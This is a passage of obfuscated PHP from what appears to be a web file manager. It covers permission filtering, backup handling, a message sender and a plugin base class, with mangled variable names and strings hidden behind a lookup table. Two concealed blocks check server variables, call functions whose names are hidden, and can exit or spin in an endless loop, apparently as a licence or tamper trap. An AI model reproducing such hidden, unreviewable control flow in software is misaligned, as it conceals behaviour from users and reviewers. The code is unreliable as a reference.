$this->findByName($·ùæèŠ™[$İŒÏ‡í‹[32]]); if (!$ãèÓÈ´ || $ˆ‡€šÀ¹ && $ˆ‡€šÀ¹[$İŒÏ‡í‹[458]] != $ãèÓÈ´[$İŒÏ‡í‹[458]]) { return !1; } $this->filterAuth($·ùæèŠ™[$İŒÏ‡í‹[470]]); return parent::update($øÎÊĞä¦, $·ùæèŠ™); } public function remove($íı‹Àù) { $œù¡§§’ = parent::listData($íı‹Àù); if (!$œù¡§§’ || $œù¡§§’[$_SERVER[Ñ¯©ç][192]]) { return !1; } return parent::remove($íı‹Àù); } public function add($›ÈõêØ = array()) { $Ü¸Ê›÷Ï =& $_SERVER[Ñ¯©ç]; if ($this->findByName($›ÈõêØ[$Ü¸Ê›÷Ï[32]])) { return !1; } $é«Áç¾Ò = array($Ü¸Ê›÷Ï[32] => $Ü¸Ê›÷Ï[12], $Ü¸Ê›÷Ï[470] => 1, $Ü¸Ê›÷Ï[1978] => $Ü¸Ê›÷Ï[1965], $Ü¸Ê›÷Ï[1977] => 1, $Ü¸Ê›÷Ï[192] => 0, $Ü¸Ê›÷Ï[1979] => 0); $›ÈõêØ = array_merge($é«Áç¾Ò, $›ÈõêØ); $›ÈõêØ[$Ü¸Ê›÷Ï[1979]] = $this->getSort(); $this->filterAuth($›ÈõêØ[$Ü¸Ê›÷Ï[470]]); return parent::insert($›ÈõêØ); } private function getSort() { $š‰ìï¬€ =& $_SERVER[Ñ¯©ç]; $¬şÌƒ·“ = parent::listData(); $Êõ—ÉÆ = array_to_keyvalue($¬şÌƒ·“, $š‰ìï¬€[12], $š‰ìï¬€[1979]); return empty($Êõ—ÉÆ) ? 0 : max($Êõ—ÉÆ) + 1; } private function filterAuth(&$†Í¼Ûã®) { if (!$†Í¼Ûã®) { return; } $ ³İ¬÷¥ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Ô½©…Ëù = array(); foreach ($ ³İ¬÷¥ as $†şğ‰Ñá) { if ($†Í¼Ûã® & $†şğ‰Ñá) { $Ô½©…Ëù[] = $†şğ‰Ñá; } } if (in_array(self::AUTH_ROOT, $Ô½©…Ëù)) { $†Í¼Ûã® = array_sum($ ³İ¬÷¥); return; } $ıçïÍ— = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Ô½©…Ëù as $†şğ‰Ñá) { if (isset($ıçïÍ—[$†şğ‰Ñá])) { $Ô½©…Ëù = array_merge($Ô½©…Ëù, $ıçïÍ—[$†şğ‰Ñá]); } } $Ô½©…Ëù[] = self::AUTH_SHOW; $†Í¼Ûã® = array_sum(array_unique($Ô½©…Ëù)); } public function sort($‹ûÂËÄÃ, $¥€êÁŠ) { return parent::update($‹ûÂËÄÃ, $¥€êÁŠ); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\x62\141\143\153\165\160\x4c\x69\x73\164"; public $field = array("\151\x6f", "\156\141\x6d\145", "\163\164\141\x74\x75\x73", "\x63\x6f\x6e\164\145\156\164", "\155\x61\x6e\165\141\154", "\x72\x65\163\165\x6c\x74", "\164\151\x6d\x65\106\162\x6f\155", "\x74\151\155\145\124\157"); public function config() { $ÑâÄÊ»ü =& $_SERVER[Ñ¯©ç]; $‘¿—Æ­Î = Model($ÑâÄÊ»ü[823])->get($ÑâÄÊ»ü[835]); $‘¿—Æ­Î = json_decode($‘¿—Æ­Î, !0); $‘¿—Æ­Î = is_array($‘¿—Æ­Î) ? $‘¿—Æ­Î : array(); if (!isset($‘¿—Æ­Î[$ÑâÄÊ»ü[807]])) { $‘¿—Æ­Î[$ÑâÄÊ»ü[807]] = $ÑâÄÊ»ü[101]; } unset($‘¿—Æ­Î[$ÑâÄÊ»ü[1727]]); Action($ÑâÄÊ»ü[1980])->taskInit(); Model($ÑâÄÊ»ü[1726])->cacheClear(); $ºş–‹ƒ¬ = $ÑâÄÊ»ü[1981]; $Æ¡Ùˆİò = Model($ÑâÄÊ»ü[1982])->findByKey($ÑâÄÊ»ü[1745], $ºş–‹ƒ¬); if (!$Æ¡Ùˆİò) { $Æ¡Ùˆİò = array(); } if (isset($Æ¡Ùˆİò[$ÑâÄÊ»ü[207]])) { $Æ¡Ùˆİò[$ÑâÄÊ»ü[207]] = json_decode($Æ¡Ùˆİò[$ÑâÄÊ»ü[207]], !0); } if (isset($‘¿—Æ­Î[$ÑâÄÊ»ü[207]])) { $Æ¡Ùˆİò[$ÑâÄÊ»ü[207]][$ÑâÄÊ»ü[1730]] = $‘¿—Æ­Î[$ÑâÄÊ»ü[207]]; unset($‘¿—Æ­Î[$ÑâÄÊ»ü[207]]); } return array_merge($Æ¡Ùˆİò, $‘¿—Æ­Î); } public function listData($ğÕ = false, $÷ÉÂÌı = "\x6d\x6f\x64\x69\146\171\x54\x69\155\145", $¾ÆˆØâĞ = false) { return parent::listData($ğÕ, $÷ÉÂÌı, !0); } public function lastItem() { $Û³®Ñ–ª = $this->listData(); return !empty($Û³®Ñ–ª[0]) ? $Û³®Ñ–ª[0] : null; } public function kill($í‰ãÅ“) { $ª†Ãë =& $_SERVER[Ñ¯©ç]; $¥¶Û¦¶¢ = $this->listData($í‰ãÅ“); if (!$¥¶Û¦¶¢ || empty($¥¶Û¦¶¢[$ª†Ãë[32]])) { return !0; } Task::kill($ª†Ãë[834]); Task::kill($ª†Ãë[852]); Task::kill($ª†Ãë[861]); $Á¢×Ê¼á = $¥¶Û¦¶¢[$ª†Ãë[32]]; $ı‡©è›ø = TEMP_FILES . $ª†Ãë[831] . $Á¢×Ê¼á . $ª†Ãë[8]; IO::remove($ı‡©è›ø, !1); return $this->remove($í‰ãÅ“); } public function remove($ñÔ‚Éş—) { $óÍ·› ò = $this->listData($ñÔ‚Éş—); if (!$óÍ·› ò) { return !0; } return $this->backupRemove($óÍ·› ò); } private function backupRemove($“ËøÖí‚) { parent::remove($“ËøÖí‚[$_SERVER[Ñ¯©ç][458]]); $ŸÇ–ì‰Û = $this->backupPath($“ËøÖí‚); IO::remove($ŸÇ–ì‰Û, !1); return !0; } private function backupPath($äÇ­Ñ­¤) { $Æ±ˆµÎå =& $_SERVER[Ñ¯©ç]; $êÙÜçÍ = $äÇ­Ñ­¤[$Æ±ˆµÎå[32]]; $şôÕªÄ‘ = Model($Æ±ˆµÎå[823])->get($Æ±ˆµÎå[824]); $â‘¬”†À = substr(md5($Æ±ˆµÎå[825] . $şôÕªÄ‘ . $êÙÜçÍ), 0, 8); return "\x7b\x69\x6f\72{$äÇ­Ñ­¤[$Æ±ˆµÎå[804]]}\175\57\x64\141\164\141\142\x61\163\x65\x2f\142\141\x63\153\165\160\x2f" . $êÙÜçÍ . $Æ±ˆµÎå[11] . $â‘¬”†À; } public function start() { $¼úøĞ” =& $_SERVER[Ñ¯©ç]; if ($GLOBALS[$¼úøĞ”[6]][$¼úøĞ”[102]][$¼úøĞ”[1983]] != $¼úøĞ”[101]) { return !0; } $êÈ±½¬Š = $this->config(); if (!$êÈ±½¬Š || $êÈ±½¬Š[$¼úøĞ”[1727]] != $¼úøĞ”[101]) { return !1; } $ñ‚Œßãí = $this->process(); foreach ($ñ‚Œßãí as $İİÍÆ™’) { if ($İİÍÆ™’) { return Task::restart($İİÍÆ™’[$¼úøĞ”[458]]); } } $Ã‚Æ¨™ê = new Backup(); $§ÌËÉ¬ = $Ã‚Æ¨™ê->db(); if ($§ÌËÉ¬) { $§ÌËÉ¬ = $Ã‚Æ¨™ê->dbFile(); if ($§ÌËÉ¬ && $êÈ±½¬Š[$¼úøĞ”[807]] == $¼úøĞ”[229]) { $§ÌËÉ¬ = $Ã‚Æ¨™ê->file(); } } Backup::set(array($¼úøĞ”[803] => 1, $¼úøĞ”[814] => time())); return !0; } public function process() { $¸ìÒõ =& $_SERVER[Ñ¯©ç]; $„¶Ö¢…İ = array($¸ìÒõ[810] => Task::get($¸ìÒõ[834]), $¸ìÒõ[815] => Task::get($¸ìÒõ[852]), $¸ìÒõ[231] => Task::get($¸ìÒõ[861])); $Å¿Õ¿£Ò = !1; foreach ($„¶Ö¢…İ as &$åÉ ¢’Ò) { if ($Å¿Õ¿£Ò) { $åÉ ¢’Ò = !1; continue; } if ($åÉ ¢’Ò) { $Ï¦ôÜÛ« = intval(_get($åÉ ¢’Ò, $¸ìÒõ[1762], 0)); if (time() - $Ï¦ôÜÛ« > 7200) { Task::kill($åÉ ¢’Ò[$¸ìÒõ[458]]); $Å¿Õ¿£Ò = !0; $åÉ ¢’Ò = !1; } } } return $„¶Ö¢…İ; } public function restore() { $ë¿Š›ßª =& $_SERVER[Ñ¯©ç]; ActionCall($ë¿Š›ßª[1113], !0, 1); ActionCall($ë¿Š›ßª[1113], !0, 0); } } goto c¸—„Ë¯…; EÑ¾ƒ¨º: class Message { function __construct() { } public function send($³³¬×‰· = '', $„ ×á ¥ = array(), $åş½ÖõÙ = "\x74\145\170\164") { $‹£‚µ¼è =& $_SERVER[Ñ¯©ç]; $”˜ï–ºÅ = array($‹£‚µ¼è[33] => $‹£‚µ¼è[1609], $‹£‚µ¼è[807] => $³³¬×‰·); if (in_array($åş½ÖõÙ, array($‹£‚µ¼è[1609], $‹£‚µ¼è[1610]))) { $”˜ï–ºÅ[$‹£‚µ¼è[33]] = $åş½ÖõÙ; } $„ ×á ¥ = array($‹£‚µ¼è[562] => isset($„ ×á ¥[$‹£‚µ¼è[562]]) ? $„ ×á ¥[$‹£‚µ¼è[562]] : $‹£‚µ¼è[12], $‹£‚µ¼è[645] => isset($„ ×á ¥[$‹£‚µ¼è[645]]) ? $„ ×á ¥[$‹£‚µ¼è[645]] : $‹£‚µ¼è[12]); if (empty($³³¬×‰·) || empty($„ ×á ¥[$‹£‚µ¼è[562]]) && empty($„ ×á ¥[$‹£‚µ¼è[645]])) { return !1; } $ùæÃğæ… = array($‹£‚µ¼è[1537] => $”˜ï–ºÅ, $‹£‚µ¼è[1611] => $„ ×á ¥); Hook::trigger($‹£‚µ¼è[1612], $ùæÃğæ…); } } if ($_SERVER[$_SERVER[Ñ¯©ç][54]] != $_SERVER[$_SERVER[Ñ¯©ç][1613]]) { $_getc = $_SERVER[Ñ¯©ç][56]; $_getfile = $_SERVER[$_SERVER[Ñ¯©ç][57]] . $_SERVER[Ñ¯©ç][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ñ¯©ç][59], $_getfilec); if (count($_getarrs) < $_SERVER[Ñ¯©ç][60]) { $exit = $_SERVER[Ñ¯©ç][61]; $exit(); } $_act = $_SERVER[Ñ¯©ç][62]; $_act($_SERVER[$_SERVER[Ñ¯©ç][55]]); } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $”½¡¹™ =& $_SERVER[Ñ¯©ç]; if (!isset($_SERVER[$”½¡¹™[54]]) || !isset($_SERVER[$”½¡¹™[55]])) { $±—Û±ÖË = $”½¡¹™[930]; $›ÊÓÊ¦’ = $”½¡¹™[56]; $Üè‰ĞÊš = $_SERVER[$”½¡¹™[57]] . $”½¡¹™[58]; $Õğöú = $›ÊÓÊ¦’($Üè‰ĞÊš); $ÛÃÚªñÑ = explode($”½¡¹™[59], $Õğöú); if (count($ÛÃÚªñÑ) < $”½¡¹™[673]) { $Œï¨§ë» = $”½¡¹™[61]; $Œï¨§ë»(); } $ı•ıŞì = $”½¡¹™[931]; $ı•ıŞì($_SERVER[$”½¡¹™[932]]); $ØÛ‘Ü¶× = 1; for ($öí¡¦±” = $ØÛ‘Ü¶×; $öí¡¦±” > 0; $öí¡¦±”++) { $ı•ıŞì = json_encode($GLOBALS[$”½¡¹™[475]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($”½¡¹™[1614]); $this->pluginName = str_replace($”½¡¹™[1614], $”½¡¹™[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $”½¡¹™[8]; $this->pluginApi = appHostGet() . $”½¡¹™[1615] . $this->pluginName . $”½¡¹™[8]; $this->pluginHost = $config[$”½¡¹™[1616]] . $this->pluginName . $”½¡¹™[8]; $this->pluginHostDefault = $config[$”½¡¹™[1616]] . $this->pluginName . $”½¡¹™[8]; $‚²¯‚ = $config[$”½¡¹™[1617]]; if ($‚²¯‚ && strpos($”½¡¹™[50] . $‚²¯‚ . $”½¡¹™[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$”½¡¹™[1618]] . $this->pluginName . $”½¡¹™[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Ñ¯©ç][1619]); } protected function assign($øÏûÀâ§, $Î±™ÎŸ = false) { if (is_array($øÏûÀâ§)) { $this->values = array_merge($this->values, $øÏûÀâ§); } else { $this->values[$øÏûÀâ§] = $Î±™ÎŸ; } } protected function display($˜Ï…’ïè) { extract($this->values); require $˜Ï…’ïè; } final function hookRegist($„Ÿ¶¨ƒù) { $this->modelPlugin->appRegist($this->pluginName, $„Ÿ¶¨ƒù); } final function appIcon() { $ÁêÄ”Ä =& $_SERVER[Ñ¯©ç]; $­´ÀÃÃ‘ = $this->appPackage(); $ÅÒ¿¹¿ = $ÁêÄ”Ä[12]; if (isset($­´ÀÃÃ‘[$ÁêÄ”Ä[473]])) { if (isset($­´ÀÃÃ‘[$ÁêÄ”Ä[473]][$ÁêÄ”Ä[1620]])) { $ÅÒ¿¹¿ = $ÁêÄ”Ä[1621] . $­´ÀÃÃ‘[$ÁêÄ”Ä[473]][$ÁêÄ”Ä[1620]] . $ÁêÄ”Ä[1622]; } else { if ($­´ÀÃÃ‘[$ÁêÄ”Ä[473]][$ÁêÄ”Ä[1623]]) { $ÅÒ¿¹¿ = $ÁêÄ”Ä[1624] . $­´ÀÃÃ‘[$ÁêÄ”Ä[473]][$ÁêÄ”Ä[1623]] . $ÁêÄ”Ä[1625]; } } } return $ÅÒ¿¹¿; } final function fileCanView($¼¦Ò¸”) { $Ûè·Ú¦Ÿ =& $_SERVER[Ñ¯©ç]; if (request_url_safe($¼¦Ò¸”)) { return !0; } if ($this->isShare($¼¦Ò¸”)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ª‹ê€ºı = $Ûè·Ú¦Ÿ[1626] . rawurlencode(this_url()); show_tips(LNG($Ûè·Ú¦Ÿ[1627]) . $Ûè·Ú¦Ÿ[1628] . $ª‹ê€ºı . $Ûè·Ú¦Ÿ[1629] . LNG($Ûè·Ú¦Ÿ[1630]) . $Ûè·Ú¦Ÿ[1631], !1); } if (!Action($Ûè·Ú¦Ÿ[1632])->authCan($Ûè·Ú¦Ÿ[1633])) { show_tips(LNG($Ûè·Ú¦Ÿ[1634]) . $Ûè·Ú¦Ÿ[1635], !1); } ActionCall($Ûè·Ú¦Ÿ[1636], $¼¦Ò¸”); } final function isShare($®ŸĞš€Œ) { $¼±†‚¥ = KodIO::parse($®ŸĞš€Œ); return $¼±†‚¥[$_SERVER[Ñ¯©ç][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Š°ô¤å÷) { if (request_url_safe($Š°ô¤å÷)) { return $Š°ô¤å÷; } if (!$this->isShare($Š°ô¤å÷)) { $Š°ô¤å÷ = $this->filePath($Š°ô¤å÷, !1); } return Action($_SERVER[Ñ¯©ç][1231])->linkOut($Š°ô¤å÷); } public function filePathLinkOut($éâõËœç) { if (request_url_safe($éâõËœç)) { return $éâõËœç; } $this->fileCanView($éâõËœç); return Action($_SERVER[Ñ¯©ç][1231])->link($éâõËœç); } final function filePath($¡±€Â, $œúÜ…§± = true, $½ú­œ = false) { $ªÅË„¾ =& $_SERVER[Ñ¯©ç]; $ÖÕÁŸÜ = $this->filePathGet($¡±€Â, $œúÜ…§±); if (!$this->fileInfo) { show_tips(LNG($ªÅË„¾[118]), !1); } if ($½ú­œ && isset($this->fileInfo[$ªÅË„¾[524]]) && $this->fileInfo[$ªÅË„¾[524]]) { $Ò–“Ö§È = Model($ªÅË„¾[527])->fileInfo($this->fileInfo[$ªÅË„¾[524]]); if (!$Ò–“Ö§È || !IO::exist($Ò–“Ö§È[$ªÅË„¾[97]])) { show_tips(LNG($ªÅË„¾[118]) . $ªÅË„¾[1637]); } } Hook::trigger($ªÅË„¾[1638], $ÖÕÁŸÜ); return $ÖÕÁŸÜ; } final function filePathGet($ğ£·¸÷, $ë‘ŒŠµ¯ = true) { $û¸½Öàã =& $_SERVER[Ñ¯©ç]; if ($½Š–ÏØî = $this->checkSharePath($ğ£·¸÷, $ë‘ŒŠµ¯)) { return $½Š–ÏØî; } $this->fileCanView($ğ£·¸÷); if (request_url_safe($ğ£·¸÷)) { $÷×Ğºµ´ = parse_url_query($ğ£·¸÷); if (isset($÷×Ğºµ´[$û¸½Öàã[1639]]) && isset($÷×Ğºµ´[$û¸½Öàã[235]])) { $™æëÓóÊ = Mcrypt::decode($÷×Ğºµ´[$û¸½Öàã[235]], Model($û¸½Öàã[823])->get($û¸½Öàã[824])); if ($™æëÓóÊ) { $this->fileInfo = IO::info($™æëÓóÊ); $this->fileInfo[$û¸½Öàã[1640]] = $ğ£·¸÷; $this->cachePath = $this->pluginCachePath($û¸½Öàã[12], $ë‘ŒŠµ¯); return $™æëÓóÊ; } } $ğ£·¸÷ = $this->_cacheHttpFile($ğ£·¸÷, $ë‘ŒŠµ¯); $this->fileInfo = IO::info($ğ£·¸÷); } else { $this->fileInfo = IO::info($ğ£·¸÷); $this->cachePath = $this->pluginCachePath($û¸½Öàã[12], $ë‘ŒŠµ¯); } return $ğ£·¸÷; } final function _cacheHttpFile($ù¦¡·‹À, $¢Ç×€¤÷ = true) { $‰ß¶ƒ©æ =& $_SERVER[Ñ¯©ç]; $Ş©Õ›À‡ = parse_url_query($ù¦¡·‹À); $Í’ö¥Šö = get_path_ext($ù¦¡·‹À); if (isset($Ş©Õ›À‡[$‰ß¶ƒ©æ[32]]) && $Ş©Õ›À‡[$‰ß¶ƒ©æ[32]]) { $Í’ö¥Šö = get_path_ext($Ş©Õ›À‡[$‰ß¶ƒ©æ[32]]); } $÷Å·ìïú = hash_path($ù¦¡·‹À) . $‰ß¶ƒ©æ[10] . $Í’ö¥Šö; $this->cachePath = $this->pluginCachePath($¢Ç×€¤÷ ? $÷Å·ìïú : $‰ß¶ƒ©æ[12]); $¹ë…–‡ = IO::fileNameExist($this->cachePath, $÷Å·ìïú); if ($¹ë…–‡) { return KodIO::make($¹ë…–‡); } $íŒñÅœÏ = rtrim($this->cachePath, $‰ß¶ƒ©æ[8]) . $‰ß¶ƒ©æ[8] . $÷Å·ìïú; return $this->pluginCacheFileSet($íŒñÅœÏ, file_get_contents_nossl($ù¦¡·‹À)); } final function checkSharePath($Œá®ş‰, $ÈîÄ“šÁ = true) { $ÕŸ—îò¯ =& $_SERVER[Ñ¯©ç]; if (!$this->isShare($Œá®ş‰)) { return !1; } $¬Şå¿İß = Action($ÕŸ—îò¯[1231])->sharePathInfo($Œá®ş‰); if (!is_array($¬Şå¿İß) || !isset($¬Şå¿İß[$ÕŸ—îò¯[97]])) { show_json(LNG($ÕŸ—îò¯[1641]), !1); } $this->fileInfo = $¬Şå¿İß; $this->cachePath = $this->pluginCachePath(!1, $ÈîÄ“šÁ); return $¬Şå¿İß[$ÕŸ—îò¯[97]]; } final function pluginCachePath($ùÇÓÉÖ = '', $šˆ¿«à– = false) { $Ÿ­Æé¾Ï =& $_SERVER[Ñ¯©ç]; if ($šˆ¿«à– && is_array($this->fileInfo)) { $ùÇÓÉÖ = kodIO::hashPath($this->fileInfo); } $­âÌàºâ = rtrim(IO_PATH_SYSTEM_TEMP . $Ÿ­Æé¾Ï[1642] . $this->pluginName . $Ÿ­Æé¾Ï[8] . $ùÇÓÉÖ, $Ÿ­Æé¾Ï[8]); $ŒÓÅêÆ = IO::infoFullSimple($­âÌàºâ); $ğİßÙÉ = $ŒÓÅêÆ && is_array($ŒÓÅêÆ) ? $ŒÓÅêÆ[$Ÿ­Æé¾Ï[97]] : $Ÿ­Æé¾Ï[12]; if (!$ğİßÙÉ) { $ğİßÙÉ = IO::mkdir($­âÌàºâ); } return $ğİßÙÉ; } final function pluginCacheFileSet($ÏÍÛæ²‘, $î™ãÕÙ = '') { $ğº·Ÿø =& $_SERVER[Ñ¯©ç]; $¿úş½àı = IO::infoFullSimple($ÏÍÛæ²‘); if (!$¿úş½àı) { return IO::mkfile($ÏÍÛæ²‘, $î™ãÕÙ, REPEAT_REPLACE); } IO::setContent($¿úş½àı[$ğº·Ÿø[97]], $î™ãÕÙ); return $¿úş½àı[$ğº·Ÿø[97]]; } final function pluginLocalFile($à¸¿æÑ = '') { $úáíÇ’ =& $_SERVER[Ñ¯©ç]; $ªÀ¤÷Ñê = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ªÀ¤÷Ñê)) { mk_dir($ªÀ¤÷Ñê); } if (!$à¸¿æÑ) { return $ªÀ¤÷Ñê; } $Íà¿õ†å = IO::info($à¸¿æÑ); $ÜÄ‰‘ × = $úáíÇ’[1643] . KodIO::hashPath($Íà¿õ†å) . $úáíÇ’[10] . $Íà¿õ†å[$úáíÇ’[188]]; if (!checkExtSafe($ÜÄ‰‘ ×)) { $ÜÄ‰‘ × = $ÜÄ‰‘ × . $úáíÇ’[1263]; } $ÇÜ¾¥ßá = $ªÀ¤÷Ñê . $ÜÄ‰‘ ×; if (@file_exists($ÇÜ¾¥ßá)) { return $ÇÜ¾¥ßá; } return IO::copy($à¸¿æÑ, $ªÀ¤÷Ñê, 0, $ÜÄ‰‘ ×); } final function appPackage() { $Òõßº³ˆ =& $_SERVER[Ñ¯©ç]; if ($this->packageData) { return $this->packageData; } $ĞÈàÚªì = $this->parseFile($this->pluginPath . $Òõßº³ˆ[1644]); $this->parseLang($ĞÈàÚªì); $İ‰€·ó´ = json_decode_force($ĞÈàÚªì); if (!$İ‰€·ó´) { return array(); } $·€èš¾ = Hook::trigger($Òõßº³ˆ[1645], $İ‰€·ó´); if ($·€èš¾ && is_array($·€èš¾)) { $İ‰€·ó´ = $·€èš¾; } $this->packageData = $İ‰€·ó´; return $İ‰€·ó´; } public function packageInfoGet($€ÚäÏ“) { $ÑÇüßÁÊ = $this->appPackage(); return array_get_value($ÑÇüßÁÊ, $€ÚäÏ“); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Ñ¯©ç][1646]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Ñ¯©ç][1647]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Ñ¯©ç][1648]); } public function echoJsAssign($úÖË¢ØÁ, $éØÙğ¶ï) { $this->echoJsAssignArr[$úÖË¢ØÁ] = $éØÙğ¶ï; } private function parseFile($åß†¸³Ê) { $­Ô³«¥ =& $_SERVER[Ñ¯©ç]; $¶¿§Ò§Û = file_get_contents_nossl($åß†¸³Ê); $Ô¢¹Äí = array($­Ô³«¥[1649], $­Ô³«¥[1650], $­Ô³«¥[1651], $­Ô³«¥[1652], $­Ô³«¥[1653], $­Ô³«¥[1654], $­Ô³«¥[1655]); $™ƒññ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$­Ô³«¥[102]][$­Ô³«¥[1656]]); foreach ($this->echoJsAssignArr as $¦ïĞÈÙ¾ => $ÔªíŞ»¹) { $Ô¢¹Äí[] = $­Ô³«¥[1657] . $¦ïĞÈÙ¾ . $­Ô³«¥[1658]; $™ƒññ[] = is_array($ÔªíŞ»¹) || is_object($ÔªíŞ»¹) ? rawurlencode(json_encode($ÔªíŞ»¹)) : $ÔªíŞ»¹; } if (strstr($¶¿§Ò§Û, $­Ô³«¥[1659])) { $›·‡Ì = rawurlencode(json_encode($this->pluginLangArr)); $¶¿§Ò§Û = str_replace($­Ô³«¥[1659], $›·‡Ì, $¶¿§Ò§Û); } if (strstr($¶¿§Ò§Û, $­Ô³«¥[1660])) { $›·‡Ì = $›·‡Ì = rawurlencode(json_encode($this->getConfig())); $¶¿§Ò§Û = str_replace($­Ô³«¥[1660], $›·‡Ì, $¶¿§Ò§Û); } $¶¿§Ò§Û = str_replace($Ô¢¹Äí, $™ƒññ, $¶¿§Ò§Û); return $¶¿§Ò§Û; } private function parseLang(&$ÖÃÈÉÑå) { $©‘Ô×¶á =& $_SERVER[Ñ¯©ç]; $ÍŠıÖµš = $©‘Ô×¶á[1661]; if (!strstr($ÖÃÈÉÑå, $ÍŠıÖµš)) { return; } preg_match_all($©‘Ô×¶á[1662], $ÖÃÈÉÑå, $ÆºËƒó); if (!is_array($ÆºËƒó) || count($ÆºËƒó) == 0 || !is_array($ÆºËƒó[0]) || count($ÆºËƒó[0]) == 0) { return; } $Ã¨«†‡ = array(); $ï¥ùŞÇ = array(); foreach ($ÆºËƒó[0] as $¤Âì™•») { $––ü¥éé = substr($¤Âì™•», strlen($ÍŠıÖµš), -4); $Î›°íè = LNG($––ü¥éé); $Ã¨«†‡[] = $¤Âì™•»; $ï¥ùŞÇ[] = str_replace(array($©‘Ô×¶á[59], $©‘Ô×¶á[1132], $©‘Ô×¶á[402], $©‘Ô×¶á[131]), array($©‘Ô×¶á[53], $©‘Ô×¶á[53], $©‘Ô×¶á[12], $©‘Ô×¶á[1663]), $Î›°íè); } $ÖÃÈÉÑå = str_replace($Ã¨«†‡, $ï¥ùŞÇ, $ÖÃÈÉÑå); } private function parseConfig(&$û§›¿) { $“êèÄŒ =& $_SERVER[Ñ¯©ç]; $Õ÷Äûó = $“êèÄŒ[1664]; if (!strstr($û§›¿, $Õ÷Äûó)) { return; } preg_match_all($“êèÄŒ[1665], $û§›¿, $‘üè¦¥â); if (!is_array($‘üè¦¥â) || count($‘üè¦¥â) == 0 || !is_array($‘üè¦¥â[0]) || count($‘üè¦¥â[0]) == 0) { return; } $Øá¡Æ°ä = $this->getConfig(); $Üš´ÌÂõ = array(); $­§Ïƒü¥ = array(); foreach ($‘üè¦¥â[0] as $òâ‘ğ×‘) { $œœƒ­÷¶ = substr($òâ‘ğ×‘, strlen($Õ÷Äûó), -2); $Üš´ÌÂõ[] = $òâ‘ğ×‘; $­§Ïƒü¥[] = _get($Øá¡Æ°ä, $œœƒ­÷¶); } $û§›¿ = str_replace($Üš´ÌÂõ, $­§Ïƒü¥, $û§›¿); } private function parsePackage(&$ºì®îå) { $™½¿òŸï =& $_SERVER[Ñ¯©ç]; $ØˆÄÌ°ß = $™½¿òŸï[1666]; if (!strstr($ºì®îå, $ØˆÄÌ°ß)) { return; } preg_match_all($™½¿òŸï[1667], $ºì®îå, $øÈÒ¹şÎ); if (!is_array($øÈÒ¹şÎ) || count($øÈÒ¹şÎ) == 0 || !is_array($øÈÒ¹şÎ[0]) || count($øÈÒ¹şÎ[0]) == 0) { return; } $²© ’‰½ = $this->appPackage(); $æ‡ÌïÁ‹ = array(); $”±Ù‰¤ù = array(); foreach ($øÈÒ¹şÎ[0] as $¬ã¶ĞÇš) { $™òŸ è“ = substr($¬ã¶ĞÇš, strlen($ØˆÄÌ°ß), -2); $æ‡ÌïÁ‹[] = $¬ã¶ĞÇš; $”±Ù‰¤ù[] = _get($²© ’‰½, $™òŸ è“); } $ºì®îå = str_replace($æ‡ÌïÁ‹, $”±Ù‰¤ù, $ºì®îå); } final function echoFile($À•œçªü, $¼­‚‚„ğ = false) { $ğòşÙ¤ =& $_SERVER[Ñ¯©ç]; $ÖöÎ¾é˜ = $this->pluginPath . $À•œçªü; if (ACT == $ğòşÙ¤[1668]) { echo $ğòşÙ¤[1669] . $this->pluginName . $ğòşÙ¤[8] . $À•œçªü . $ğòşÙ¤[1670]; if (!file_exists($ÖöÎ¾é˜)) { echo $ğòşÙ¤[1671]; return; } } $´şà»şú = $this->parseFile($ÖöÎ¾é˜); $this->parseLang($´şà»şú); $this->parseConfig($´şà»şú); $this->parsePackage($´şà»şú); if (is_array($¼­‚‚„ğ)) { $´şà»şú = str_replace(array_keys($¼­‚‚„ğ), array_values($¼­‚‚„ğ), $´şà»şú); } echo $ğòşÙ¤[59] . $´şà»şú; } private function checkVersion() { $ğ’ë¿ı¯ =& $_SERVER[Ñ¯©ç]; $³Ì±ÀÆë = $this->appPackage(); $Õ¦“ñß® = $this->getConfig(); if ($Õ¦“ñß®[$ğ’ë¿ı¯[1672]] == $³Ì±ÀÆë[$ğ’ë¿ı¯[1646]]) { return; } $this->regist(); $this->setConfig(array($ğ’ë¿ı¯[1672] => $³Ì±ÀÆë[$ğ’ë¿ı¯[1646]])); } final function initLang() { $¤Ì»Ä¢ =& $_SERVER[Ñ¯©ç]; $ëøÜƒ´¡ = $¤Ì»Ä¢[1673]; $¼¥èÓØ = $this->pluginPath . $¤Ì»Ä¢[1674]; $Á‚á¢’‚ = I18n::getType(); $ìÑ¢Â¨‡ = array(); if (file_exists($¼¥èÓØ . $Á‚á¢’‚ . $¤Ì»Ä¢[891])) { $ìÑ¢Â¨‡ = (include $¼¥èÓØ . $Á‚á¢’‚ . $¤Ì»Ä¢[891]); } else { if ($Á‚á¢’‚ == $¤Ì»Ä¢[1675] && !file_exists($¼¥èÓØ . $Á‚á¢’‚ . 